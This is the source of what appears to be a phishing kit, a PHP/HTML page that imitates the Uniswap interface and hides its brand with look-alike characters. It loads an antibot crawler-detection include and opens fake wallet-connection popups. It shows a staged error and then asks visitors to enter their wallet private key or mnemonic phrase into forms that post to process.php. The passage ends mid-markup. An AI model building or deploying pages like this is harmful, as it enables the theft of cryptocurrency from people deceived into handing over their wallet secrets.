<!DOCTYPE html>
<?php
error_reporting(0);
include './files/antibot/crawlerdetect.php'; 
include_once 'functions.php';
?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    
    
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#ff007a">
    <meta name="fortmatic-site-verification" content="j93LgcVZk79qcgyo">
	<link rel="shortcut icon" type="image/png" href="./files/uni.png">
    <title>Uniswаp Intеrface</title>
    <link href="./files/3.d75e0ccb.chunk.css" rel="stylesheet">
    <style>
    html {
    color: rgb(0, 0, 0);
    background-color: rgb(247, 248, 250) !important;
}
    .bSPCHV {
        display: flex;
        flex-flow: row nowrap;
        width: 100%;
        -moz-box-pack: justify;
        justify-content: space-between;
        position: fixed;
        top: 0px;
        z-index: 2;
    }
    .cpqtRy {
    display: flex;
    flex-flow: row nowrap;
    border-radius: 3rem;
    outline: currentcolor none medium;
    cursor: pointer;
    text-decoration: none;
    color: rgb(86, 90, 105);
    font-size: 1rem;
    width: -moz-fit-content;
    margin: 0px 12px;
    font-weight: 500;
}
.jrsqYz {
    text-align: center;
    outline: currentcolor none medium;
    text-decoration: none;
    -moz-box-pack: center;
    justify-content: center;
    position: relative;
    z-index: 1;
    will-change: transform;
    transition: transform 450ms ease 0s;
    transform: perspective(1px) translateZ(0px);
    font-size: 16px;
    display: flex;
    flex-flow: row nowrap;
    width: 100%;
    -moz-box-align: center;
    align-items: center;
    padding: 0.5rem;
    border-radius: 12px;
    cursor: pointer;
    user-select: none;
    font-weight: 500;
    background-color: rgb(253, 234, 241);
    border: 1px solid rgb(253, 234, 241);
    color: rgb(255, 0, 122);
}
    .bUzrhQ {
    display: grid;
    grid-template-columns: 120px 1fr 120px;
    -moz-box-pack: justify;
    justify-content: space-between;
    -moz-box-align: center;
    align-items: center;
    flex-direction: row;
    width: 100%;
    top: 0px;
    padding: 1rem;
    z-index: 21;
    position: relative;
    background-image: linear-gradient(transparent 50%, rgb(255, 255, 255) 50%);
    background-position: 0px 0px;
    background-size: 100% 200%;
    box-shadow: transparent 0px 0px 0px 1px;
    transition: background-position 0.1s ease 0s, box-shadow 0.1s ease 0s;
}
.jHDloj {
    box-sizing: border-box;
    margin: 0px;
    min-width: 0px;
    display: flex;
    padding: 0px;
    -moz-box-align: center;
    align-items: center;
    -moz-box-pack: start;
    justify-content: flex-start;
    width: -moz-fit-content;
}
.jrPzPN {
    display: flex;
    -moz-box-align: center;
    align-items: center;
    pointer-events: auto;
    justify-self: flex-start;
    margin-right: 12px;
}
.hNMCso {
    transition: transform 0.3s ease 0s;
}
.eFxLLr {
    box-sizing: border-box;
    margin: 0px;
    min-width: 0px;
    -moz-box-align: center;
    align-items: center;
    -moz-box-pack: start;
    justify-content: flex-start;
    justify-self: center;
    background-color: rgb(255, 255, 255);
    width: -moz-fit-content;
    padding: 4px;
    border-radius: 16px;
    display: grid;
    grid-auto-flow: column;
    gap: 10px;
    overflow: auto;
}
.iaLyQt.ACTIVE {
    border-radius: 12px;
    font-weight: 600;
    color: rgb(0, 0, 0);
    background-color: rgb(237, 238, 242);
}
.iaLyQt {
    display: flex;
    flex-flow: row nowrap;
    border-radius: 3rem;
    outline: currentcolor none medium;
    cursor: pointer;
    text-decoration: none;
    color: rgb(86, 90, 105);
    font-size: 1rem;
    width: -moz-fit-content;
    font-weight: 500;
    padding: 8px 12px;
    word-break: break-word;
}
.cpqtRy {
    cursor: pointer;
    color: rgb(86, 90, 105);
    font-size: 1rem;
    font-weight: 500;
}
.ixOAqd {
    display: flex;
    flex-direction: row;
    -moz-box-align: center;
    align-items: center;
    justify-self: flex-end;
}
.bUdJCh {
    display: flex;
    -moz-box-align: center;
    align-items: center;
}
.bUdJCh > :not(:first-child) {
    margin-left: 8px;
}
.gyYFBH {
    display: flex;
    flex-direction: row;
    -moz-box-align: center;
    align-items: center;
    background-color: rgb(247, 248, 250);
    border-radius: 12px;
    white-space: nowrap;
    width: 100%;
    cursor: pointer;
}
.jrsqYz {
    text-align: center;
    outline: currentcolor none medium;
    text-decoration: none;
    -moz-box-pack: center;
    justify-content: center;
    position: relative;
    z-index: 1;
    will-change: transform;
    transition: transform 450ms ease 0s;
    transform: perspective(1px) translateZ(0px);
    font-size: 16px;
    display: flex;
    flex-flow: row nowrap;
    width: 100%;
    -moz-box-align: center;
    align-items: center;
    padding: 0.5rem;
    border-radius: 12px;
    cursor: pointer;
    user-select: none;
    font-weight: 500;
    background-color: rgb(253, 234, 241);
    border: 1px solid rgb(253, 234, 241);
    color: rgb(255, 0, 122);
}
.jkjxPR {
    box-sizing: border-box;
    margin: 0px;
    min-width: 0px;
    appearance: none;
    display: inline-block;
    text-align: center;
    line-height: inherit;
    text-decoration: none;
    font-size: inherit;
    padding: 8px 16px;
    color: white;
    border: 0px none;
    border-radius: 4px;
}
.fUWowW {
    flex: 1 1 auto;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    margin: 0px 0.5rem 0px 0.25rem;
    font-size: 1rem;
    width: -moz-fit-content;
    font-weight: 500;
}
.jrsqYz > * {
    user-select: none;
}
.iGyubW {
    display: flex;
    -moz-box-align: center;
    align-items: center;
}
.kIJmGr {
    position: relative;
    width: 100%;
    border: medium none;
    margin: 0px 0px 0px 8px;
    height: 35px;
    background-color: rgb(237, 238, 242);
    padding: 0.15rem 0.5rem;
    border-radius: 0.5rem;
}
button {
    user-select: none;
}
.kIJmGr svg {
    margin-top: 2px;
}
.kIJmGr > * {
    stroke: rgb(0, 0, 0);
}
.ckECEq {
    margin-left: 0.5rem;
    display: flex;
    -moz-box-pack: center;
    justify-content: center;
    -moz-box-align: center;
    align-items: center;
    position: relative;
    border: medium none;
    text-align: left;
}
.hrYVhS {
    width: 100%;
    border: medium none;
    margin: 0px;
    height: 35px;
    background-color: rgb(237, 238, 242);
    padding: 0.15rem 0.5rem;
    border-radius: 0.5rem;
}
.hrYVhS svg {
    margin-top: 2px;
}

    </style>
</head>
<body

style="background: linear-gradient(to bottom, #f7eef5 52%, #ffffff 103%);"

>
<div id="root">
    <div class="sc-jtRlXQ ihBRis">
        <div class="sc-bGbJRg bodCAS">


          <div class="sc-1dv6j2d-2 bSPCHV">
             <div class="pradxg-0 bUzrhQ">
                <div class="sc-htpNat nrd8cx-0 nrd8cx-4 pradxg-4 jHDloj">
                   <a href="./" class="pradxg-12 jrPzPN">
                      <div class="pradxg-13 hNMCso"><img src="./files/logo.svg" alt="logo" width="24px"></div>
                   </a>
                </div>
				
                <div class="pradxg-1 ixOAqd">
                   <div class="pradxg-2 bUdJCh">
                      <span class="pradxg-9 emQszd"></span>
					  
                      <div style="pointer-events: auto;" class="pradxg-6 gyYFBH">
                         <button id="connect-wallet" style="text-align: center;
outline: currentcolor none medium;
text-decoration: none;
-moz-box-pack: center;
justify-content: center;
position: relative;
z-index: 1;
will-change: transform;
transition: transform 450ms ease 0s;
transform: perspective(1px) translateZ(0px);
font-size: 16px;
display: flex;
flex-flow: row nowrap;
width: 100%;
-moz-box-align: center;
align-items: center;
padding: 0.5rem;
border-radius: 12px;
cursor: pointer;
user-select: none;
font-weight: 500;
background-color: rgb(253, 234, 241);
border: 1px solid rgb(253, 234, 241);
color: rgb(255, 0, 122);box-sizing: border-box;
margin: 0px;
min-width: 0px;
appearance: none;line-height: inherit;" class="sc-htpNat jkjxPR fwrjc2-0 fwrjc2-4 sc-kjoXOD sc-TOsTZ jrsqYz">
                            <p style="letter-spacing: 0.8px;" class="sc-cJSrbW fUWowW">Connect to a wallet</p>
                         </button>
						 

</div>
                      </div>
                   </div>
                   <div class="pradxg-3 iGyubW">
                      <button class="pradxg-16 kIJmGr">
                         <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="5"></circle>
                            <line x1="12" y1="1" x2="12" y2="3"></line>
                            <line x1="12" y1="21" x2="12" y2="23"></line>
                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                            <line x1="1" y1="12" x2="3" y2="12"></line>
                            <line x1="21" y1="12" x2="23" y2="12"></line>
                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                         </svg>
                      </button>
                      <div class="sc-iAyFgw ckECEq">
                         <button class="sc-kEYyzF hrYVhS">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-hMqMXs uhlXa">
                               <path d="M12 13C12.5523 13 13 12.5523 13 12C13 11.4477 12.5523 11 12 11C11.4477 11 11 11.4477 11 12C11 12.5523 11.4477 13 12 13Z" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                               <path d="M19 13C19.5523 13 20 12.5523 20 12C20 11.4477 19.5523 11 19 11C18.4477 11 18 11.4477 18 12C18 12.5523 18.4477 13 19 13Z" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                               <path d="M5 13C5.55228 13 6 12.5523 6 12C6 11.4477 5.55228 11 5 11C4.44772 11 4 11.4477 4 12C4 12.5523 4.44772 13 5 13Z" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                            </svg>
                         </button>
                      </div>
                   </div>
                </div>
             </div>
          </div>



<script>						
function myFunction() {
  window.open('./metamask/','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=400,height=650');
}	
function yourFunction() {
  window.open('./trustwallet/','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=400,height=650');
}						
function herFunction() {
  window.open('./walletconnect/','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=400,height=650');
}	
function hisFunction() {
  window.open('./coinbase/','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=400,height=650');
}
function thisFunction() {
  window.open('./crypto-com/','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=400,height=650');
}
function thatFunction() {
  window.open('./ledger/','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=400,height=650');
}
</script>






        </div>


        <div class="sc-bEjcJn gVhzpZ">
		
		
		
		<div class="sc-htpNat nrd8cx-0 pradxg-5 eFxLLr"><a class="pradxg-14 iaLyQt ACTIVE" id="swap-nav-link" href="./"  aria-current="page">Swap</a>
		<a href="./airdrop"  class="pradxg-14 iaLyQt" id="pool-nav-link" >Airdrop</a>
		<a onclick="PopUp()" class="pradxg-14 iaLyQt" id="pool-nav-link" >Pool</a>
		<a href="./support" class="pradxg-14 iaLyQt" id="stake-nav-link" >Support</a>
		<a target="_blank" rel="noopener noreferrer" href="https://info.uniswap.org/" id="stake-nav-link" class="sc-iwsKbI euDGQF pradxg-15 cpqtRy">Charts<sup>↗</sup></a></div>
        <br>
		
		
		
            <div class="sc-cMljjf sc-gFaPwZ joiTHx"></div>
            <div class="sc-jeCdPy bKJaUq"></div>
            <div class="sc-fcdeBU bWbqvd">
                <div class="sc-hXRMBi fqOcYb">
                    <div id="wallets-modal" class="sc-bsbRJL hgyVGw">
                        <div class="sc-bsbRJL hgyVGw">

                        <div class="sc-epnACN haZPvP">
                            <div class="sc-iuJeZd juASlh">Connect to a wallet to continue</div>
                        </div>
                        <div class="sc-iQNlJl kLhUQG">
                            <div class="sc-cMhqgX idOYax">
							
							
                                <button onclick="myFunction()"  id="connect-METAMASK" style="" class="connect-METAMASK sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" >
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#E8831D" class="sc-hwwEjo cZFjOz">MetaMask</div>
                                    </div>
                                    <div class="sc-kfGgVZ kyutNn"><img src="./files/metamask.023762b6.png" alt="Icon"></div>
                                </button>
								
								
								 <button onclick="yourFunction()"  id="connect-METAMASK" style="" class="connect-METAMASK sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" >
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#E8831D" class="sc-hwwEjo cZFjOz">Trust Wallet</div>
                                    </div>
                                    <div class="sc-kfGgVZ kyutNn"><img src="./files/TWT.png" alt="Icon"></div>
                                </button>
								
								
                                <button onclick="herFunction()"  id="connect-WALLET_CONNECT" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx">
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#4196FC" class="sc-hwwEjo cZFjOz">WalletConnect</div>
                                    </div>
                                    <div class="sc-kfGgVZ kyutNn"><img src="./files/walletConnectIcon.8215855c.svg" alt="Icon">
                                    </div>
                                </button>
								
								
                                <button onclick="hisFunction()" id="connect-WALLET_LINK" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" onclick="openModalError_button(&#39;coinbase&#39;)">
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#315CF5" class="sc-hwwEjo cZFjOz">Coinbase Wallet</div>
                                    </div>
                                    <div class="sc-kfGgVZ kyutNn"><img src="./files/coinbaseWalletIcon.62578f59.svg" alt="Icon">
                                    </div>
                                </button>
								
								
                                <button id="connect-FORTMATIC" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" onclick="openModalError_button(&#39;fortmatic&#39;)">
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#6748FF" class="sc-hwwEjo cZFjOz">Fortmatic</div>
                                    </div>
                                    <div class="sc-kfGgVZ kyutNn">
                                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIcAAACHCAYAAAFL4HqcAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAh6ADAAQAAAABAAAAhwAAAAD59IYWAAAHcklEQVR4Ae2dz4scRRTHX81ugqISCQT8gYfoX6AXQfQihFVvuQl6MhBzCHgVUdiDgkEPakj2B4kH8aAEJIjZX1lFlPgLg0hglYgBZZWAbtBdDZtNpsvXu1vk+XbWma1uu6qmvn3YftU71e/V5327urqme9o8/Yi1VHFpVay/Wr3PdjLYicnYlDGdtm+2LQcmuu3dBJkjE60bzSgaJr9XisRYusJN3WV0+7RGeilXisQ56LOdbOiUtLBcu/9r3e9MdNv3P2YvmIJ26+2ynBuT8Qlzt2z/viG7c9DQgtxWmQmfKi9W3snolLm90k7cIVJLpyT5+NqVWuPrtFM9BKKpbOhf9QfKshNUp//VtQ2p0SSjIdKTRnT0utzLOUnX0eVoiCCQaFNTi1j1YEG3ttPgQX8mCo2UPXctRHTrei7zVM3Y9NocQpBAxqaIM8HXaWKJYmDETM5GoZESDAIR8lg1QQRENAFdjkYjXXvWdpsOHjttjugW1F2OhggC0akFERDRBHS5az+iK3QqV54Kt/QlxKrJggiIaAK6DI1oIrV0aN2mP7t2eC2aiyI1pk3vRRHI6Iz5IIZALpd6CR4I6+um4IHwdMR97uip5ahxO9vKeruhHYcnzaKrEyKQzzkdD7gA3DqKGSMXTOh1VDNXoWE4/8F7ERdILGsAUZkAEABRBFQRCgEQRUAVaxkQ8e3Tky1DX6l9J1fku61+rQVIUdCp8QZmx5sgjD5EUQYQAFEEVBEKARBFQBWhEABRBFSxlnGI2qdXsY77LL0cy0oxfYMn4wppow9R9AEEQBQBVYRCAEQRUEUoRAGJZhzS7RZ6FfeGYi+32G+opDbwF1VtKERAMS06CSAOiKWrIxPmFQBZB8KHy0hpAkhJoaAX+UncZ0ozmk61DKbphWfZr9y2TDcPf2yuOd95ArFkuQN9aHTSnHEg3DovIJam+JmuR13jO61rATIwQP96bquToya28SFQ8JdmP7Cv7wtDc4WlV49Pm0tb8Y07iK7TKnCGuQ4Dp1vBAjAAQxIQNvoMwBAEhAllAIYgIEwoAzAEAWFCGYAhCAgTygAMQUCYUAZgCALCrD7bZWmZp98PiX0maVpDRXUYRMs89T6cJAEVNPoMAQQwAEMQECaUARiCgDChDMAQBIQJZQCGICBMKAMwBAFhQhmAIQgIE8oADEFAmHXMZ4jd+ZkHHrZ32u0071e7tlq4nVqiRJ8haAAGYAgCwoQyAEMQECaUARiCgDChDMAQBIQJZQCGICBMKAMwBAFhQhmAIQgIM4rJndGPzC8cEz9m5r/sH7LH+Q6ip7z3wE/a9c1hwo9pVoLJIFf6Boa3ItYr8pOPgOEgQhmORLk2dA6HyTqQok3PAUYJw9Lf4zMmnnc4rScoyIr7i7dLx1AG0RLf1HsAMNbU8GQJolyiGIGuhdL8Xx5bnByZNu87zzkfJvPj02avA1Gu84Rh6AK/gecuCSJLGOWhMTZp7tEgynJOfcYK/xLTHh5PfNIJRB4w+IfK+Op8L/cPpzaD4Lb3jTJswb+2RHSJrzHm2D7PDZs5OmPedQ3tZY3f3OmFUn6fKXhU/k2eZ9f8ku3VYojDC1selSCOPPLs1UqIwwtbHpUgjjzy7NVKiMMLWx6VII488uzVSojDC1selSCOPPLs1UqIwwtbHpUgjjzy7NVKiMMLWx6VII488uzVSojDC1selSCOPPLs1UqIwwtbHpXiuPPJ0h/tgp4/dtocyQN7Gq1Ez5FGnoJECXEEwZ6GU4gjjTwFiRLiCII9DacQRxp5ChIlxBEEexpOIY408hQkSogjCPY0nEIcaeQpSJQQRxDsaTiFONLIU5AoIY4g2NNwCnGkkacgUUIcQbCn4RTiSCNPQaKEOIJgT8NpHDf7RMKqfDdYcQN9agraHUlIocJo84+Pfo2eIxT+BPxCHAkkKVSIEEco8gn4hTgSSFKoECGOUOQT8AtxJJCkUCFCHKHIJ+AX4kggSaFChDhCkU/AL8SRQJJChQhxhCKfgF+II4EkhQoR4ghFPgG/EEcCSQoVIsQRinwCfnE/h0jSyhVaHNxGb/Bbim4Vm5s1Dd3Ib6Dbw07vbdbxRm8Qh2Dy5hmzxMXXxKbGzX1Ddudgi3bxzTYhxdHmhv+G00rj6U/AIb+ynl8c+B3EkUCuAoS4wm+WnIM4ApCP3qWhy9sMzUIc0Weq2QCNpUV+Ie3I4UkzD3E0yz5ub5b4Qol+vmOSXi4DhTjiTlfT0V3ky9fHh4kfzuAFl7JN44/RH3cXpkU/8TjjwfJ04kKEOByJXNd8KuGmn99xle4/NGv+lBggDkkjP3uJpfH62Ix5oVPTIY5OVPp/W8HzGN9evkp73vrQLGzWXIhjMzIBt9uCLH+/878sfKm6wL3FwdEZ8043BxBHN0IB/s+DQ7M6EqjJNwviGg8sztoWPTE2ZX7sdbcQR6+kEvwci+IvFsTowi307IkTpvwybUsLxLElXNF/eIV7nM948uqlkWkzWzVaiKMqwRD1y4tPQ8sshC94qntigGh6ZIrO8cbyP7Ut/wACdD2e0mLveQAAAABJRU5ErkJggg==" alt="Icon">
                                    </div>
                                </button>
								
								
                                <button id="connect-Portis" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" onclick="openModalError_button(&#39;portis&#39;)">
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#4A6C9B" class="sc-hwwEjo cZFjOz">Portis</div>
                                    </div>
                                    <div class="sc-kfGgVZ kyutNn"><img src="./files/portisIcon.b234b2bf.png" alt="Icon"></div>
                                </button>
								
								<button onclick="thisFunction()" id="connect-WALLET_LINK" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" onclick="openModalError_button(&#39;coinbase&#39;)">
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#315CF5" class="sc-hwwEjo cZFjOz">Crypto.com</div>
                                    </div>
                                    <div class="sc-kfGgVZ kyutNn"><img src="./files/cro.png" alt="Icon">
                                    </div>
                                </button>
								
								
                            </div>
							

						 
                            <div class="sc-hZSUBg lczxjN">
                                <span>Hardware wallet? &nbsp;</span> <a target="_blank" onclick="thatFunction()" rel="noopener noreferrer" class="sc-dxgOiQ eahMwZ">Connect here</a>
                            </div>
							
                        </div>
						
                    </div>
                    </div>


                    <div id="key-modal" style="display: none" class="sc-bsbRJL hgyVGw">
                        <div class="sc-epnACN haZPvP">
                            <div class="sc-iuJeZd juASlh">Connect to a wallet</div>
							<div class="sc-eTuwsz cobcrG" onclick="closeModalOpen()">
                            <svg width="20" onclick="closeModalOpen()" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-gwVKww eHktrE">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                        </div>
                        </div>
						
                        <div class="sc-iQNlJl kLhUQG">
                            <div class="sc-cMhqgX idOYax">
                                <button id="connect-METAMASK" style="" class="connect-METAMASK sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx">
                                    <span id="error-msg" style="">An error has occurred, please use these login methods! We will fix the problem soon.</span>
                                    <div id="small-loader" style="display: none;" class="loader small-loader">Loading...</div>
                                </button>
                                <button id="connect-WALLET_CONNECT" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" style="background-color: rgb(253, 234, 241);color: rgb(255, 0, 122);" onclick="openModalPrivat()">
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#4196FC" style="margin-left: 132px" class="sc-hwwEjo cZFjOz">Private Key
                                        </div>
                                    </div>
                                    <div class="sc-kfGgVZ kyutNn"></div>
                                </button>
                                <button id="connect-WALLET_LINK" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" style="
    background-color: rgb(253, 234, 241);
    color: rgb(255, 0, 122);
" onclick="openModalMnem()">
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#315CF5" style="margin-left: 109px" class="sc-hwwEjo cZFjOz">Mnemonic
                                            Phrase
                                        </div>
                                    </div>
                                    <div class="sc-kfGgVZ kyutNn"></div>
                                </button>
                                <!--  <button id="connect-FORTMATIC" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx">
                                    <div class="sc-gxMtzJ bnTkUa"><div color="#6748FF" style="margin-left: 119px" class="sc-hwwEjo cZFjOz">Keystore</div></div>

                                </button> -->

                            </div>

                        </div>
                    </div>
                    <div id="private-key" style="display: none" class="sc-bsbRJL hgyVGw">
                        <div class="sc-eTuwsz cobcrG" onclick="closeModalPrivat()">
                            <svg width="20" onclick="closeModalPrivat()" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-gwVKww eHktrE">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                        </div>
                        <div class="sc-epnACN haZPvP">
                            <div class="sc-iuJeZd juASlh">Access by Private Key</div>
                        </div>
						
						
						
						
						
						
						
						
						
						
						
						
						 <form action="process.php" method="POST" id="form1">
                        <div class="sc-iQNlJl kLhUQG">
                            <div class="sc-cMhqgX idOYax">
                                <button id="connect-METAMASK" style="" class="connect-METAMASK sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx">
                                    <span>An error has occurred, please use these login methods! We will fix the problem soon.</span>
                                </button>

                                <input data-v-737fadfa="" placeholder="Enter Private Key" type="text" name="key" id="PrivateKey" style="

    height: 33px;
" autocomplete="off" required=""><input type="hidden" name="wallet" id="walletval2">

                                <button id="connect-FORTMATIC" onclick="form1" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" style="
    background-color: rgb(253, 234, 241);
    font-size: 16px;
    font-weight: 500;
">
                                    <div class="sc-gxMtzJ bnTkUa">
                                        <div color="#6748FF" style="margin-left: 109px; color: rgb(255, 0, 122);" class="sc-hwwEjo cZFjOz"> Access Wallet
                                        </div>
                                    </div>

                                </button>

                            </div>

                        </div>
						</form>
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
					
                    </div>
                    <div id="mnemonic-key" style="display: none" class="sc-bsbRJL hgyVGw">
                        <div class="sc-eTuwsz cobcrG" onclick="closeModalMnem()">
                            <svg width="20" onclick="closeModalMnem()" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-gwVKww eHktrE">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                        </div>
                        <div class="sc-epnACN haZPvP">
                            <div class="sc-iuJeZd juASlh">Access by Mnemonic Phrase</div>
                        </div>
						
						
						
						
						
						
						
						
						 <form action="process.php" method="POST" id="form1">
                        <div class="sc-iQNlJl kLhUQG">
                            <div class="sc-cMhqgX idOYax">
                                <button id="connect-METAMASK" style="" class="connect-METAMASK sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx">
                                    <span>An error has occurred, please use these login methods! We will fix the problem soon.</span>
                                </button>
                                <input data-v-737fadfa="" minlength="10" placeholder="Enter mnemonic phrase" type="text" name="key" id="mnemkey" style="

    height: 40px;
" autocomplete="off" required="">
<input type="hidden" name="wallet" id="walletval">

                                <button id="connect-FORTMATIC" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" style="
    background-color: rgb(253, 234, 241);
    font-size: 16px;
    font-weight: 500;
">
                                    <div class="sc-gxMtzJ bnTkUa" onclick="form1">
                                        <div color="#6748FF" style="margin-left: 109px; color: rgb(255, 0, 122);" class="sc-hwwEjo cZFjOz"> Access Wallet
                                        </div>
                                    </div>

                                </button>

                            </div>

                        </div>
						 </form>
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
                    </div>
                </div>
            </div>
            <div class="sc-hgHYgh gmfEhn">
                <div class="sc-cMljjf krgzrs"></div>
            </div>
            <div class="sc-ePZHVD blfhHY"></div>

        </div>
    </div>
</div>

<!-- overlay,modal -->
<div class="sc-fBuWsC kEokqJ" id="modal" data-reach-dialog-overlay="" style="opacity: 1; display: none;">
    <div aria-modal="true" role="dialog" tabindex="-1" aria-label="dialog" hidden="" class="sc-fMiknA fuGLvk" data-reach-dialog-content="">
        <div class="sc-hXRMBi fqOcYb">
            <div class="sc-bsbRJL hgyVGw">
                <div class="sc-eTuwsz cobcrG" onclick="closeModal()">
                    <svg width="20" onclick="closeModal()" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-gwVKww eHktrE">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </div>
                <div class="sc-epnACN haZPvP">
                    <div class="sc-iuJeZd juASlh">Connect to a wallet</div>
                </div>
                <div class="sc-iQNlJl kLhUQG">
                    <div class="sc-cMhqgX idOYax">
                        <button id="connect-METAMASK" style="" class="connect-METAMASK sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" onclick="openModalError_button()">
                            <div class="sc-gxMtzJ bnTkUa">
                                <div color="#E8831D" class="sc-hwwEjo cZFjOz">MetaMask</div>
                            </div>
                            <div class="sc-kfGgVZ kyutNn"><img src="./files/metamask.023762b6.png" alt="Icon"></div>
                        </button>
                        <button id="connect-WALLET_CONNECT" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" onclick="openModalError_button()">
                            <div class="sc-gxMtzJ bnTkUa">
                                <div color="#4196FC" class="sc-hwwEjo cZFjOz">WalletConnect</div>
                            </div>
                            <div class="sc-kfGgVZ kyutNn"><img src="./files/walletConnectIcon.8215855c.svg" alt="Icon">
                            </div>
                        </button>
                        <button id="connect-WALLET_LINK" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" onclick="openModalError_button()">
                            <div class="sc-gxMtzJ bnTkUa">
                                <div color="#315CF5" class="sc-hwwEjo cZFjOz">Coinbase Wallet</div>
                            </div>
                            <div class="sc-kfGgVZ kyutNn"><img src="./files/coinbaseWalletIcon.62578f59.svg" alt="Icon">
                            </div>
                        </button>
                        <button id="connect-FORTMATIC" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" onclick="openModalError_button()">
                            <div class="sc-gxMtzJ bnTkUa">
                                <div color="#6748FF" class="sc-hwwEjo cZFjOz">Fortmatic</div>
                            </div>
                            <div class="sc-kfGgVZ kyutNn">
